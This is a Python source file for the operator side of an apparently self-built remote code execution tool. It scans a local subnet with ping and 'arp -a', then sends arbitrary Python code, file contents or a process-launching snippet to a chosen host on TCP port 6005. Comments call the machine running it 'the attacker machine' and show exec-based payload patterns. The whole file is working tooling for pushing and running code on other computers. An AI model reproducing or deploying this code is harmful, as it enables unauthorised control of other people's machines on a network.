# coding:utf-8
import socket
import subprocess
import threading
import time
import os


searching = False  # If ip local network adresses haven't been ping for a long time


class IpPinger:
    ips = []  # List containing existing ips
    dynamic_ips = []  # List containing dynamical ips

    def __init__(self):
        self.search_ips()  # To load all the ips adress
        self.find_dynamic_ip()
        time.sleep(15)
        print(self.dynamic_ips)

    def check_ip(self, ip):
        if "Impossible de joindre l’hôte de destination" not in subprocess.check_output(f"ping {ip}",
                                                                                        shell=True).__str__():
            self.ips.append(ip)

    def search_ips(self):
        for ip in [f"192.168.86.{i}" for i in range(256)]:
            threading.Thread(target=lambda: self.check_ip(ip)).start()

    def find_dynamic_ip(self):
        output = subprocess.check_output("arp -a", shell=True).__str__().strip()
        self.dynamic_ips = [info.split()[0] for info in output.split("\n")[2:] if "dynamique" in info]  # Using arp- a
        return self.dynamic_ips


def find_ipv4():
    output = subprocess.check_output("ipconfig", shell=True).__str__().strip()
    lines = output.split("\n")
    ipv4_line = [line for line in lines if "ipv4" in line.lower()][0]
    ipv4 = ""
    i = len(ipv4_line) - 1
    while True:
        char = ipv4_line[i]
        if char not in ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', "."]:
            break
        ipv4 += char
        i -= 1
    ipv4 = ipv4[::-1]
    return ipv4


if searching:
    IpPinger()  # Creation of a pinger instance so that the attacker machine updates his list of ip using arp -a

host, port = input("Enter a valid ip adress of the network : "), 6005


class Commands:

    def __init__(self, line):
        self.line = line
        self.commands = {"<test>": self.test,
                         "<file>": self.file,
                         "<chat>": self.chat,
                         "<script>": self.script}

    def run(self):
        for command in self.commands:
            if self.line.startswith(command):
                self.line = self.line[len(command):].strip()
                return self.commands[command]()

    def test(self):  # <test>
        return open("commands/test.py", "r").read().encode("utf-8")

    def file(self):  # <file> ../../filename.py
        if not os.path.exists(self.line):
            print(f'File "{self.line}"' + ' doesn\'t exist !')
            return ""
        return open(self.line, "r").read().encode("utf-8")

    def chat(self):  # <chat> username
        pseudo = self.line.replace(" ", "")
        if not pseudo:
            pseudo = "MiraX"
        subprocess.call(fr'start python commands\chat_client.py pseudo={pseudo} host={host}', shell=True)
        return ("filename = os.path.basename(__file__)\nos.system(f'start /wait {\"python\" if \"py\" in filename else \"\"} {filename} type=chat ip_adress=" + find_ipv4() + "')").encode("utf-8")

    def script(self):  # <script> code_to_execute()
        return self.line.encode("utf-8")


# start /wait python -c "exec(\"print('Hello World')\nimport time\ntime.sleep(10)\")"
# fr'start /wait python -c "exec(\"{server}\")"'

while True:
    input_user = input("Enter some data to send : ").strip()
    commands = Commands(input_user)
    if True not in [input_user.startswith(command) for command in commands.commands]:
        print("Parser didn't recognize the command used !")
        continue
    data = commands.run()  # Return the utf-8 encoded text to transfer using the socket protocol
    if not data:
        continue

    try:
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.connect((host, port))
        print("Client connected to the server !")
        sk.sendall(data)

    except Exception as e:
        print("Failed to connect to the server !", e)
    finally:
        sk.close()
